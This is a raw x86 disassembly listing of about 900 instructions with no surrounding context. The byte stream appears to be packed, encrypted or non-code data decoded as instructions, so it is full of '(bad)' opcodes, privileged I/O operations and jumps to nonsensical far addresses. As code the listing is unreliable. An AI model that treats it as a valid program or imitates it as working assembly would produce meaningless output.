  413d9d:	imul   BYTE PTR [ebp-0x4f]
  413da0:	jnp    0x413da4
  413da2:	push   0xffffffb2
  413da4:	xchg   ebp,eax
  413da5:	mov    ds:0xf94b56f1,eax
  413daa:	dec    esp
  413dab:	push   es
  413dac:	aad    0x23
  413dae:	pop    ebp
  413daf:	xor    ecx,esi
  413db1:	jns    0x413dc4
  413db3:	mov    eax,ds:0x6e96d225
  413db8:	adc    eax,0xce2a4d4b
  413dbd:	sbb    al,0xf7
  413dbf:	int3   
  413dc0:	inc    ecx
  413dc1:	imul   eax,edx,0x55aab60d
  413dc7:	(bad)  
  413dc8:	cs in  eax,0x88
  413dcb:	xor    esp,DWORD PTR ds:0x3b2fc9e2
  413dd1:	cmp    DWORD PTR [edx+0x0],edx
  413dd4:	mov    DWORD PTR [ecx-0x51011cb8],eax
  413dda:	in     eax,0x19
  413ddc:	fild   QWORD PTR [ebp+0x6]
  413ddf:	sahf   
  413de0:	xchg   DWORD PTR [ecx],edi
  413de2:	out    0x3e,eax
  413de4:	fcomp  st(2)
  413de6:	sahf   
  413de7:	adc    DWORD PTR [ebx+0x171740c3],ebx
  413ded:	xchg   edi,eax
  413dee:	push   cs
  413def:	idiv   BYTE PTR [edi-0x39e6a39]
  413df5:	inc    edi
  413df6:	js     0x413d91
  413df8:	loope  0x413d97
  413dfa:	xchg   ebp,eax
  413dfb:	fwait
  413dfc:	daa    
  413dfd:	daa    
  413dfe:	out    dx,eax
  413dff:	xchg   ebp,eax
  413e00:	retf   0x661c
  413e03:	outs   dx,DWORD PTR ds:[esi]
  413e04:	aad    0x0
  413e06:	mov    cl,0x82
  413e08:	mov    esi,ebp
  413e0a:	sahf   
  413e0b:	imul   eax,esp,0xdd33a621
  413e11:	jge    0x413dc1
  413e13:	iret   
  413e14:	jno    0x413dc3
  413e16:	test   eax,0xfe8b3eed
  413e1b:	lahf   
  413e1c:	out    dx,al
  413e1d:	inc    eax
  413e1e:	or     eax,0x4ddded3
  413e23:	cmp    eax,0xa68076da
  413e28:	jno    0x413e1a
  413e2a:	inc    ebx
  413e2b:	and    eax,0xd37f0a37
  413e30:	sub    ebp,DWORD PTR [edx-0x3e5f5bca]
  413e36:	mov    ds:0xf2664dd,al
  413e3b:	ficom  DWORD PTR [edi-0x69d96d90]
  413e41:	repz stc 
  413e43:	cmp    al,0x17
  413e45:	push   ecx
  413e46:	push   0x94390ee3
  413e4b:	jle    0x413ebd
  413e4d:	aaa    
  413e4e:	in     al,0x39
  413e50:	adc    eax,0x43cb88d5
  413e55:	nop
  413e56:	sbb    ecx,DWORD PTR [ebx+eax*4+0x3f]
  413e5a:	(bad)  
  413e5b:	xchg   ebp,eax
  413e5c:	scas   eax,DWORD PTR es:[edi]
  413e5d:	push   es
  413e5e:	xor    eax,0xc39d1c4b
  413e63:	dec    edi
  413e64:	pop    ds
  413e65:	loopne 0x413e74
  413e67:	fidiv  WORD PTR [edx]
  413e69:	sbb    eax,0x509681c1
  413e6e:	je     0x413e86
  413e70:	nop
  413e71:	or     eax,0xdc4d3141
  413e76:	sub    bh,BYTE PTR [eax-0x5286af0f]
  413e7c:	dec    DWORD PTR [edi-0x72]
  413e7f:	xchg   edi,eax
  413e80:	dec    esp
  413e81:	jno    0x413e1d
  413e83:	cwde   
  413e84:	aaa    
  413e85:	ins    DWORD PTR es:[edi],dx
  413e86:	cmp    BYTE PTR [esi+0x72],dh
  413e89:	in     eax,0x8a
  413e8b:	out    dx,eax
  413e8c:	mov    ds:0x75ee6cd6,al
  413e91:	pop    esi
  413e92:	sbb    al,0x54
  413e94:	(bad)  
  413e95:	ds sahf 
  413e97:	sti    
  413e98:	cmp    BYTE PTR [ebp+0x65],cl
  413e9b:	push   ebx
  413e9c:	sub    DWORD PTR [esi+0x290cf21d],edx
  413ea2:	sbb    DWORD PTR [eax+0x1a],edi
  413ea5:	shl    BYTE PTR [eax],cl
  413ea7:	mov    esi,0xadd242d0
  413eac:	retf   
  413ead:	ss inc edx
  413eaf:	jns    0xfef1b267
  413eb5:	lahf   
  413eb6:	xchg   edx,eax
  413eb7:	(bad)  
  413eb8:	push   edx
  413eb9:	clc    
  413eba:	lods   eax,DWORD PTR ds:[esi]
  413ebb:	call   0x21b4:0xb7cfa098
  413ec2:	fsub   QWORD PTR [ebp-0x67178359]
  413ec8:	adc    esi,DWORD PTR [esi+0x75670a7d]
  413ece:	cmp    al,0x91
  413ed0:	sub    al,0x5e
  413ed2:	dec    ebp
  413ed3:	xchg   edx,eax
  413ed4:	div    BYTE PTR [edx+edi*1]
  413ed7:	adc    ebp,0xd55d981
  413edd:	mov    edi,0xb1517d5
  413ee2:	das    
  413ee3:	(bad)  
  413ee4:	(bad)  
  413ee5:	dec    eax
  413ee6:	shl    DWORD PTR [ebx+0x187b3d30],cl
  413eec:	xor    al,0x8b
  413eee:	sbb    BYTE PTR [esi],ah
  413ef0:	sbb    DWORD PTR [esi+0x73],ecx
  413ef3:	and    al,0x5a
  413ef5:	std    
  413ef6:	leave  
  413ef7:	pop    edi
  413ef8:	in     al,0x26
  413efa:	or     bl,bh
  413efc:	stos   DWORD PTR es:[edi],eax
  413efd:	xor    DWORD PTR [ebp+0x33],esi
  413f00:	jle    0x413f47
  413f02:	pop    ebp
  413f03:	int    0x8b
  413f05:	add    DWORD PTR ds:[esi],ebx
  413f08:	mov    bl,0xf8
  413f0a:	adc    eax,0xb866d28e
  413f0f:	imul   esp,DWORD PTR [eax+0x27e4db6c],0x65
  413f16:	sahf   
  413f17:	(bad)  [ecx]
  413f19:	ja     0x413f42
  413f1b:	movd   DWORD PTR [ecx],mm7
  413f1e:	out    dx,eax
  413f1f:	hlt    
  413f20:	fsubr  DWORD PTR [edx-0x32]
  413f23:	mov    ebx,0x45247526
  413f28:	scas   eax,DWORD PTR es:[edi]
  413f29:	jmp    0x413fa5
  413f2b:	adc    edi,DWORD PTR [esi]
  413f2d:	pushf  
  413f2e:	std    
  413f2f:	ror    BYTE PTR [esi+0x61],cl
  413f32:	sbb    al,0x75
  413f34:	dec    ecx
  413f35:	fs jmp 0xd16b1177
  413f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3c:	fidivr DWORD PTR [eax+esi*1-0x25]
  413f40:	out    dx,al
  413f41:	mov    ecx,0xd38c23b0
  413f46:	dec    ecx
  413f47:	lahf   
  413f48:	test   eax,0xb2b9d644
  413f4d:	ficomp WORD PTR [esi-0x6d]
  413f50:	and    eax,0x763ad3af
  413f55:	push   ebp
  413f56:	mov    edx,0xe0fae156
  413f5b:	dec    ebp
  413f5c:	jle    0x413f1c
  413f5e:	pop    edi
  413f5f:	push   cx
  413f61:	pop    esp
  413f62:	pop    es
  413f63:	(bad)  
  413f64:	out    dx,al
  413f65:	in     al,dx
  413f66:	mov    DWORD PTR [ecx],0x7e6730ee
  413f6c:	pop    ebp
  413f6d:	push   ss
  413f6e:	jmp    0xcde83c07
  413f73:	add    eax,0x7d26ebfb
  413f78:	push   ecx
  413f79:	jge    0x413f31
  413f7b:	jmp    0x8dd8:0x7c02df2b
  413f82:	push   ecx
  413f83:	add    al,0x8f
  413f85:	mov    ebx,0x74beed69
  413f8a:	hlt    
  413f8b:	xchg   ecx,eax
  413f8c:	adc    al,0x2
  413f8e:	or     DWORD PTR [eax-0x7],esp
  413f91:	inc    esp
  413f92:	mov    esp,0x398e6399
  413f97:	xchg   BYTE PTR [esi+0x48cf547d],cl
  413f9d:	bound  ebx,QWORD PTR [ecx-0x6a729692]
  413fa3:	xor    al,0x28
  413fa5:	pushf  
  413fa6:	in     eax,0x7
  413fa8:	popa   
  413fa9:	ds pop esi
  413fab:	stos   BYTE PTR es:[edi],al
  413fac:	mov    DWORD PTR [esi],esi
  413fae:	mov    ds:0xefb4078,al
  413fb3:	xchg   BYTE PTR ds:0x97a59e30,bl
  413fb9:	and    ebp,DWORD PTR [eax+0x544475f8]
  413fbf:	sub    edx,DWORD PTR [esi-0x22514a7]
  413fc5:	scas   al,BYTE PTR es:[edi]
  413fc6:	push   eax
  413fc7:	aas    
  413fc8:	stos   DWORD PTR es:[edi],eax
  413fc9:	iret   
  413fca:	cmp    al,0xec
  413fcc:	icebp  
  413fcd:	mov    edi,0xef4d4f74
  413fd2:	fstp   TBYTE PTR [eax]
  413fd4:	push   cs
  413fd5:	mov    WORD PTR [eax-0x41],?
  413fd8:	call   0xc150383d
  413fdd:	aas    
  413fde:	mov    WORD PTR [edi+edx*8+0x78727c41],cs
  413fe5:	fisub  WORD PTR [ebx+0x2d47284e]
  413feb:	push   eax
  413fec:	pop    ss
  413fed:	xchg   DWORD PTR [esi-0x341fa8dc],esi
  413ff3:	pop    ecx
  413ff4:	data16 aad 0x59
  413ff7:	jnp    0x413fef
  413ff9:	out    dx,eax
  413ffa:	fcom   QWORD PTR [ecx+0x5bdd8396]
  414000:	shr    BYTE PTR [ebp+0x4d],0xb
  414004:	aam    0x5a
  414006:	push   0xffffffc7
  414008:	into   
  414009:	imul   edi,ecx,0x3895954e
  41400f:	ds jmp 0xf668:0x87b96e87
  414017:	shl    BYTE PTR [eax-0x7e0748fa],1
  41401d:	mov    dl,0xc
  41401f:	pop    esp
  414020:	inc    eax
  414021:	dec    edx
  414022:	pushf  
  414023:	mov    ebp,0xbd0996e
  414028:	jbe    0x414008
  41402a:	(bad)  
  41402b:	pop    ebx
  41402c:	or     BYTE PTR [eax],cl
  41402e:	mov    dl,0xd6
  414030:	stos   BYTE PTR es:[edi],al
  414031:	pop    esp
  414032:	mov    cl,bh
  414034:	mov    esi,0x6354dd5c
  414039:	out    dx,eax
  41403a:	xchg   esi,eax
  41403b:	push   ebx
  41403c:	mov    dl,BYTE PTR [eax+0x3613c3aa]
  414042:	dec    edi
  414043:	xchg   ecx,eax
  414044:	neg    BYTE PTR [edx+0x1a]
  414047:	stc    
  414048:	retf   0xca05
  41404b:	aas    
  41404c:	xchg   ecx,eax
  41404d:	ss fdivr st(7),st
  414050:	lods   al,BYTE PTR ds:[esi]
  414051:	sub    esp,DWORD PTR [ecx]
  414053:	xor    ah,BYTE PTR [eax+edx*8-0x1fad27b8]
  41405a:	dec    edx
  41405b:	xor    eax,0xb8c034f6
  414060:	jmp    0x38fa0027
  414065:	ds sbb ah,ah
  414068:	call   ebx
  41406a:	sub    DWORD PTR [esi],eax
  41406c:	std    
  41406d:	pushf  
  41406e:	pop    eax
  41406f:	push   ebp
  414070:	push   eax
  414071:	add    BYTE PTR [edi+ecx*4],al
  414074:	jmp    0x9dd7:0x81f34f86
  41407b:	ret    
  41407c:	push   ds
  41407d:	dec    edi
  41407e:	fild   QWORD PTR [edi+0x7a42b52e]
  414084:	push   es
  414085:	inc    ecx
  414086:	outs   dx,BYTE PTR ds:[esi]
  414087:	mov    dl,0xe6
  414089:	out    dx,al
  41408a:	or     eax,0xfb660ba1
  41408f:	sbb    al,0x98
  414091:	sbb    esp,DWORD PTR [ecx]
  414093:	sub    al,0xd2
  414095:	xchg   esp,eax
  414096:	cmp    eax,0xbde1a3e0
  41409b:	fisttp WORD PTR [si+0x824]
  4140a0:	fidivr WORD PTR [eax+0x36]
  4140a3:	(bad)  
  4140a4:	fcomip st,st(3)
  4140a6:	dec    edx
  4140a7:	dec    ecx
  4140a8:	cmp    al,0xfb
  4140aa:	sbb    al,0x52
  4140ac:	hlt    
  4140ad:	mov    DWORD PTR [edi],eax
  4140af:	in     eax,dx
  4140b0:	pmaxsw mm1,QWORD PTR [edi+eiz*2-0x6f]
  4140b5:	jb     0x4140b2
  4140b7:	xor    esp,DWORD PTR [ebp+0x2a7e6ecb]
  4140bd:	mov    al,0xc2
  4140bf:	mov    ebp,DWORD PTR [ebx-0x67]
  4140c2:	ins    DWORD PTR es:[edi],dx
  4140c3:	in     al,dx
  4140c4:	mov    WORD PTR [ebp+0x567ee40b],fs
  4140ca:	enter  0x78b6,0x10
  4140ce:	mov    edi,0x88b33a7c
  4140d3:	das    
  4140d4:	test   BYTE PTR [eax+0x31dcb292],ah
  4140da:	icebp  
  4140db:	jne    0x414102
  4140dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140de:	or     al,0xee
  4140e0:	sbb    ebp,ebp
  4140e2:	mov    esi,0xc926109a
  4140e7:	mov    bl,0x48
  4140e9:	aam    0x24
  4140eb:	mov    ebp,0x611529ba
  4140f0:	das    
  4140f1:	cmp    DWORD PTR [ebp+0x71],esi
  4140f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140f5:	cli    
  4140f6:	scas   eax,DWORD PTR es:[edi]
  4140f7:	ins    BYTE PTR es:[edi],dx
  4140f8:	adc    ah,BYTE PTR [edi]
  4140fa:	jnp    0x4140ed
  4140fc:	das    
  4140fd:	sbb    ebp,esi
  4140ff:	jo     0x414134
  414101:	aaa    
  414102:	fs jne 0x4140ab
  414105:	sbb    DWORD PTR [esi-0x7b80c4e7],edx
  41410b:	inc    ecx
  41410c:	jo     0x414153
  41410e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410f:	cmp    ebx,edx
  414111:	sub    DWORD PTR [ebp-0x4fbd41cd],edx
  414117:	nop
  414118:	fidiv  WORD PTR [esi-0x4642fc4e]
  41411e:	call   0x9d9f01ab
  414123:	ucomiss xmm4,DWORD PTR [edi-0x7]
  414127:	ins    DWORD PTR es:[edi],dx
  414128:	push   ds
  414129:	or     edi,0x31
  41412c:	jle    0x41412f
  41412e:	lock cli 
  414130:	adc    BYTE PTR ds:0xa9ec79b0,dh
  414136:	cld    
  414137:	into   
  414138:	cli    
  414139:	das    
  41413a:	sbb    bh,cl
  41413c:	push   edi
  41413d:	push   0xffffffb2
  41413f:	adc    ebp,DWORD PTR [ebx+0x66]
  414142:	test   eax,0x5927e082
  414147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414148:	mov    edi,0xfc59166
  41414d:	dec    ebx
  41414e:	dec    esi
  41414f:	cmp    DWORD PTR [esi-0x1f],0x6f7ad2c5
  414156:	shl    DWORD PTR ds:0xfa9ae4aa,1
  41415c:	sahf   
  41415d:	xor    dh,dh
  41415f:	inc    edi
  414160:	dec    ebp
  414161:	xchg   ebp,eax
  414162:	mov    ebx,0x6c935cb2
  414167:	pop    edx
  414168:	scas   al,BYTE PTR es:[edi]
  414169:	xchg   DWORD PTR [eax-0xb],edi
  41416c:	ror    BYTE PTR [ecx],cl
  41416e:	pop    esi
  41416f:	inc    ah
  414171:	jmp    ebp
  414173:	sub    ebx,DWORD PTR [eax-0x4d]
  414176:	or     ah,BYTE PTR [edi+edi*1+0x1bef4e8d]
  41417d:	sub    esi,DWORD PTR [eax]
  41417f:	push   ss
  414180:	pushf  
  414181:	dec    cl
  414183:	jg     0x41415f
  414185:	aam    0x14
  414187:	fcmovu st,st(1)
  414189:	pop    ebx
  41418a:	mov    dh,0x78
  41418c:	adc    eax,0xb60b80a3
  414191:	pop    esi
  414192:	aaa    
  414193:	pusha  
  414194:	adc    dh,bl
  414196:	shl    BYTE PTR [edx-0x21],cl
  414199:	sahf   
  41419a:	pop    edi
  41419b:	outs   dx,BYTE PTR ds:[esi]
  41419c:	mov    cl,0x58
  41419e:	inc    ebp
  41419f:	push   ecx
  4141a0:	pushf  
  4141a1:	inc    ebp
  4141a2:	imul   ebx
  4141a4:	stc    
  4141a5:	sub    edx,DWORD PTR [esi-0x6a]
  4141a8:	in     al,dx
  4141a9:	stos   DWORD PTR es:[edi],eax
  4141aa:	jg     0x4141ec
  4141ac:	or     cl,BYTE PTR [esi-0x3ed3280]
  4141b2:	imul   dh
  4141b4:	cmp    eax,0xf35d6c94
  4141b9:	std    
  4141ba:	mov    cl,0x52
  4141bc:	cmp    dl,BYTE PTR [edi+edi*8+0x20]
  4141c0:	push   edi
  4141c1:	iret   
  4141c2:	cmp    DWORD PTR [edi+0x780f87d1],esp
  4141c8:	pop    ecx
  4141c9:	mov    al,ds:0xeee36575
  4141ce:	out    dx,eax
  4141cf:	cld    
  4141d0:	push   esp
  4141d1:	push   ds
  4141d2:	mov    edi,0x514ae26c
  4141d7:	rol    BYTE PTR [eax+0x1f7de049],0x51
  4141de:	and    BYTE PTR [edi+esi*8+0x4c],ah
  4141e2:	jge    0x41416f
  4141e4:	lods   eax,DWORD PTR ds:[esi]
  4141e5:	popf   
  4141e6:	push   edi
  4141e7:	or     eax,0x43265285
  4141ec:	adc    DWORD PTR [esi],esp
  4141ee:	adc    BYTE PTR ds:0x289e08ed,dl
  4141f4:	jo     0x414235
  4141f6:	xchg   BYTE PTR [ecx+0x46d39ee5],dl
  4141fc:	xlat   BYTE PTR ds:[ebx]
  4141fd:	jbe    0x4141d3
  4141ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414200:	out    0x2f,al
  414202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414203:	add    eax,0x5c853b2e
  414208:	inc    edx
  414209:	dec    eax
  41420a:	retf   
  41420b:	mov    dh,0x69
  41420d:	stos   DWORD PTR es:[edi],eax
  41420e:	scas   eax,DWORD PTR es:[edi]
  41420f:	sysret 
  414211:	or     eax,DWORD PTR [ecx+0x68cffa47]
  414217:	push   ss
  414218:	cmp    BYTE PTR [esi-0x6d29cc2e],al
  41421e:	add    bh,BYTE PTR [edx-0x60]
  414221:	add    dh,BYTE PTR [ebp-0x66c65fea]
  414227:	xchg   ebp,eax
  414228:	xor    bl,BYTE PTR [ebx]
  41422a:	fwait
  41422b:	loopne 0x4141d0
  41422d:	ds dec edx
  41422f:	xlat   BYTE PTR ds:[ebx]
  414230:	inc    ebp
  414231:	ret    
  414232:	hlt    
  414233:	sub    BYTE PTR [ebx-0x1543b7af],ah
  414239:	mov    ecx,0xa7919503
  41423e:	fst    QWORD PTR [ecx+0x71]
  414241:	dec    ecx
  414242:	inc    ebx
  414243:	pop    esi
  414244:	cld    
  414245:	sub    BYTE PTR gs:[eax-0x53],bh
  414249:	add    DWORD PTR [edx],esi
  41424b:	mov    bh,0x4c
  41424d:	mov    dh,0xc8
  41424f:	stos   DWORD PTR es:[edi],eax
  414250:	xor    dh,ch
  414252:	fdiv   QWORD PTR [esi]
  414254:	and    dl,BYTE PTR [edi-0x607c29f2]
  41425a:	xchg   edi,eax
  41425b:	sahf   
  41425c:	fldenv [edx]
  41425e:	sub    BYTE PTR [edx],bl
  414260:	retf   0xc64a
  414263:	dec    ebp
  414264:	mov    al,ds:0x55787ba4
  414269:	into   
  41426a:	cli    
  41426b:	rcr    BYTE PTR [ebp+0x5ab180ec],cl
  414271:	push   es
  414272:	dec    ebx
  414273:	mov    al,0x5f
  414275:	imul   esp,DWORD PTR [eax],0xf45c6548
  41427b:	call   0xa138:0xf12eaf9c
  414282:	scas   al,BYTE PTR es:[edi]
  414283:	jmp    0xdfc4c8d4
  414288:	mov    esi,eax
  41428a:	add    DWORD PTR [eax],0xaf66999e
  414290:	sbb    al,bl
  414292:	leave  
  414293:	in     al,0xaa
  414295:	scas   eax,DWORD PTR es:[edi]
  414296:	(bad)  
  414297:	and    BYTE PTR [ebp-0x6c],ch
  41429a:	rcl    BYTE PTR [edi+0x41d6b3d4],1
  4142a0:	add    ebx,esp
  4142a2:	leave  
  4142a3:	es test eax,0x96b076bd
  4142a9:	sti    
  4142aa:	mov    edi,0x3c7f2a52
  4142af:	in     al,0x7c
  4142b1:	mov    eax,ds:0x5a22e2ca
  4142b6:	jno    0x414331
  4142b8:	nop
  4142b9:	arpl   WORD PTR [edi-0x2716f47b],bx
  4142bf:	pop    esi
  4142c0:	mov    al,ds:0x925cee94
  4142c5:	jp     0x41424e
  4142c7:	cmp    DWORD PTR [ebx-0x5b532af8],ebx
  4142cd:	dec    edx
  4142ce:	(bad)  
  4142cf:	dec    esp
  4142d0:	mov    esp,0x5b2cbc9a
  4142d5:	mov    ebp,0xf56d441f
  4142da:	scas   eax,DWORD PTR es:[edi]
  4142db:	fist   WORD PTR [esi+0x4]
  4142de:	jmp    0xeac7d6a3
  4142e3:	iret   
  4142e4:	inc    ebx
  4142e5:	aam    0xab
  4142e7:	mov    ds:0xfde28e57,al
  4142ec:	mov    al,0xbe
  4142ee:	jns    0x4142f7
  4142f0:	jns    0x41429f
  4142f2:	cmp    eax,0x1b5cfbef
  4142f7:	mov    ch,0x59
  4142f9:	sti    
  4142fa:	cmp    DWORD PTR [edi],ebx
  4142fc:	sub    esi,DWORD PTR [edi]
  4142fe:	das    
  4142ff:	cmp    esp,ebp
  414301:	sub    DWORD PTR [eax+0x51843dd6],0x2f0c4a91
  41430b:	and    ebp,DWORD PTR [ebx]
  41430d:	mov    al,ds:0x41debf03
  414312:	aad    0x3b
  414314:	and    edi,ebx
  414316:	xchg   edi,eax
  414317:	xchg   ebp,eax
  414318:	cmp    BYTE PTR [edx],ah
  41431a:	fcmovu st,st(6)
  41431c:	bound  esi,QWORD PTR [ebx+0x1befefe1]
  414322:	data16 sbb BYTE PTR [esi+0x345ecd12],bl
  414329:	out    dx,eax
  41432a:	push   ebp
  41432b:	outs   dx,BYTE PTR ds:[esi]
  41432c:	mov    esp,0x38295626
  414331:	aad    0xb7
  414333:	xchg   esi,eax
  414334:	nop
  414335:	cmp    al,BYTE PTR [ecx+0x7c]
  414338:	mov    ds:0x2331750c,eax
  41433d:	stos   DWORD PTR es:[edi],eax
  41433e:	push   ecx
  41433f:	repz sbb DWORD PTR [ebx],esp
  414342:	test   dl,dl
  414344:	dec    edi
  414345:	push   esp
  414346:	cmp    ah,BYTE PTR [edi+0x6a]
  414349:	out    0x52,eax
  41434b:	outs   dx,BYTE PTR ds:[esi]
  41434c:	xchg   ecx,eax
  41434d:	inc    sp
  41434f:	rcr    DWORD PTR ds:0xe6e86a9,cl
  414355:	pop    ds
  414356:	mov    ds:0x2430cf0d,al
  41435b:	jns    0x41438b
  41435d:	and    eax,0x66796376
  414362:	xchg   ecx,eax
  414363:	fwait
  414364:	(bad)  
  414365:	jmp    0x1916:0xc9d1b2dd
  41436c:	repnz les esi,FWORD PTR [esi-0x16b4d66a]
  414373:	ud2    
  414375:	inc    ecx
  414376:	sahf   
  414377:	mov    ebp,0x1e7e8885
  41437c:	hlt    
  41437d:	cwde   
  41437e:	fistp  DWORD PTR [edx-0x58]
  414381:	(bad)  [edx]
  414383:	mov    al,0x9d
  414385:	adc    ebp,edi
  414387:	add    BYTE PTR [eax],bh
  414389:	cmc    
  41438a:	sbb    BYTE PTR [esi+0x725042af],dl
  414390:	pop    edi
  414391:	or     edi,DWORD PTR [eax]
  414393:	sbb    BYTE PTR [edi],ah
  414395:	push   ss
  414396:	pop    edi
  414397:	or     BYTE PTR [ebx],al
  414399:	lahf   
  41439a:	xor    ch,bl
  41439c:	adc    al,0xee
  41439f:	stos   BYTE PTR es:[edi],al
  4143a0:	ins    BYTE PTR es:[edi],dx
  4143a1:	jecxz  0x4143c0
  4143a3:	add    eax,DWORD PTR [esi+0x409f8c]
  4143a9:	xchg   edx,eax
  4143aa:	inc    ebp
  4143ab:	in     eax,dx
  4143ac:	ret    0xe35a
  4143af:	(bad)  
  4143b1:	test   al,0x8b
  4143b3:	lahf   
  4143b4:	inc    ecx
  4143b5:	pop    ebx
  4143b6:	inc    ebx
  4143b7:	popa   
  4143b8:	sub    al,BYTE PTR [ebx]
  4143ba:	fistp  WORD PTR [esi+0x24d6018f]
  4143c0:	nop    ecx
  4143c3:	fidivr DWORD PTR [ecx+0x3f41257f]
  4143c9:	sbb    bl,bl
  4143cb:	pushf  
  4143cc:	cli    
  4143cd:	dec    eax
  4143ce:	xor    eax,0x8cd1cc69
  4143d3:	pop    eax
  4143d4:	stc    
  4143d5:	push   0x8e92f555
  4143da:	(bad)  
  4143db:	(bad)  
  4143dc:	mov    ah,0x18
  4143de:	pop    esi
  4143df:	xlat   BYTE PTR ds:[ebx]
  4143e0:	xchg   ecx,eax
  4143e1:	adc    BYTE PTR [esi+0x32360323],cl
  4143e7:	cmp    eax,0xe16225b7
  4143ec:	aas    
  4143ed:	xor    eax,DWORD PTR [ecx]
  4143ef:	jl     0x414374
  4143f1:	and    DWORD PTR [ebx+0x3f81f9be],edx
  4143f7:	mov    cl,0xdd
  4143f9:	test   DWORD PTR [edi],esp
  4143fb:	jns    0x41440b
  4143fd:	bound  edx,QWORD PTR [edi]
  4143ff:	fwait
  414400:	push   0x5ff92c2b
  414405:	inc    esp
  414406:	xchg   edx,eax
  414407:	adc    edx,esp
  414409:	call   0x97c9b408
  41440e:	retf   
  41440f:	jg     0x4143c7
  414411:	dec    ebp
  414412:	icebp  
  414413:	sub    DWORD PTR [ebx-0x2c734bd4],0xd889dd94
  41441d:	in     al,0xd0
  41441f:	add    al,0xa7
  414421:	push   0x1118fd3b
  414426:	stc    
  414427:	inc    esi
  414428:	mov    dl,0x1c
  41442a:	mov    ecx,DWORD PTR [edi+0xfb7aaab]
  414430:	lods   eax,DWORD PTR ds:[esi]
  414431:	(bad)  
  414432:	mov    WORD PTR ds:[eax+0x3e],cs
  414436:	mov    edi,0xfcc1e66a
  41443b:	and    bl,BYTE PTR [ecx-0x47fcf13c]
  414441:	es inc ebp
  414443:	mov    BYTE PTR [ecx+0x198e1fc8],ah
  414449:	dec    edx
  41444a:	dec    ebp
  41444b:	out    0xd6,al
  41444d:	imul   esp,DWORD PTR [ecx],0x7760253f
  414453:	pushf  
  414454:	xor    ebx,DWORD PTR [ebx+0x76f2ec4d]
  41445a:	ins    BYTE PTR es:[edi],dx
  41445b:	cdq    
  41445c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41445d:	test   eax,0xb0dd1dd3
  414462:	xchg   ebx,eax
  414463:	dec    ecx
  414464:	dec    edi
  414465:	loop   0x4144cb
  414467:	rcr    BYTE PTR [ecx+0x73],1
  41446a:	stos   BYTE PTR es:[edi],al
  41446b:	add    dh,bh
  41446d:	lock mov dl,0x78
  414470:	gs jns 0x4144c3
  414473:	ret    0x42e4
  414476:	imul   ebp,ebp,0x1cc09365
  41447c:	push   ecx
  41447d:	cld    
  41447e:	outs   dx,BYTE PTR ds:[esi]
  41447f:	(bad)  
  414480:	fisttp QWORD PTR [esi-0x5b866a7b]
  414486:	cdq    
  414487:	mov    bl,0xdf
  414489:	mov    bl,dh
  41448b:	mov    edx,0x1358f85d
  414490:	adc    DWORD PTR [ecx],ebp
  414492:	xchg   esi,eax
  414493:	or     esp,edx
  414495:	inc    ebp
  414496:	pusha  
  414497:	sbb    eax,0xf444e29f
  41449c:	sub    eax,0xe6b90d64
  4144a1:	scas   eax,DWORD PTR es:[edi]
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	jns    0x41447e
  4144a5:	and    eax,0x4a46900b
  4144aa:	mov    BYTE PTR [ecx+ebx*4-0x2b],0xb8
  4144af:	and    BYTE PTR [ecx+eiz*8-0x66],0xe7
  4144b4:	cmp    eax,0xac961d9a
  4144b9:	fisttp QWORD PTR ss:[ecx-0x204c18c7]
  4144c0:	nop
  4144c1:	out    dx,al
  4144c2:	icebp  
  4144c3:	mov    esp,0x613203cb
  4144c8:	rcr    DWORD PTR [ebp-0xa92c664],cl
  4144ce:	mov    ds:0x10eca93,al
  4144d3:	xlat   BYTE PTR ds:[ebx]
  4144d4:	inc    ebx
  4144d5:	in     eax,dx
  4144d6:	mov    eax,0xf80315c4
  4144db:	push   cs
  4144dc:	jl     0x414521
  4144de:	hlt    
  4144df:	(bad)  
  4144e0:	sub    eax,0xd09dbc7e
  4144e5:	xchg   esi,eax
  4144e6:	fldcw  WORD PTR [edx]
  4144e8:	mov    bl,0x89
  4144ea:	adc    eax,0x4558edb8
  4144ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144f0:	std    
  4144f1:	shr    DWORD PTR [ebx+0x2c6c4f24],1
  4144f7:	pop    esi
  4144f8:	adc    ebx,DWORD PTR [ebp-0x1cbd7235]
  4144fe:	fistp  DWORD PTR [ecx+eiz*4]
  414501:	out    0x1f,eax
  414503:	jecxz  0x41454e
  414505:	cmp    al,0x1b
  414507:	inc    ebp
  414508:	stos   BYTE PTR es:[edi],al
  414509:	push   edi
  41450a:	(bad)  
  41450b:	sub    ebx,DWORD PTR [esi+0x42]
  41450e:	sbb    esi,ecx
  414510:	cmp    eax,0xc90303df
  414515:	jb     0x4144c1
  414517:	and    eax,0x608d95c4
  41451c:	push   es
  41451d:	xor    DWORD PTR [esi-0x5c],esp
  414520:	loope  0x4144c0
  414522:	pop    ss
  414523:	jg     0x41459d
  414525:	daa    
  414526:	loopne 0x41459b
  414528:	dec    BYTE PTR [ecx+0xd8a7bc5]
  41452e:	cmp    al,0xd4
  414530:	sahf   
  414531:	inc    esp
  414532:	cmp    eax,0x41fe0031
  414537:	cmp    cl,ah
  414539:	xchg   esp,eax
  41453a:	ror    ecx,cl
  41453c:	cmp    BYTE PTR [edx-0x7058190b],0x3b
  414543:	sbb    eax,0xfa4e02b0
  414548:	mov    cs,WORD PTR [ecx]
  41454a:	dec    ebx
  41454b:	and    ebx,DWORD PTR [ecx-0x78718007]
  414551:	and    al,0x1f
  414553:	lock js 0x4145d4
  414556:	push   0xff0e5ef5
  41455b:	outs   dx,BYTE PTR ds:[esi]
  41455c:	(bad)
  414560:	mov    cl,0xd2
  414562:	pop    edx
  414563:	add    eax,0xf3e1ea08
  414568:	pop    eax
  414569:	lds    ebx,FWORD PTR ds:0x475ae0da
  41456f:	push   eax
  414570:	mov    al,ds:0x61be240
  414575:	add    al,0x36
  414577:	rol    esi,0x79
  41457a:	sbb    al,al
  41457c:	scas   eax,DWORD PTR es:[edi]
  41457d:	mov    ah,0x80
  41457f:	xchg   ebp,eax
  414580:	mov    eax,0x3237929e
  414585:	ret    
  414586:	jns    0x414583
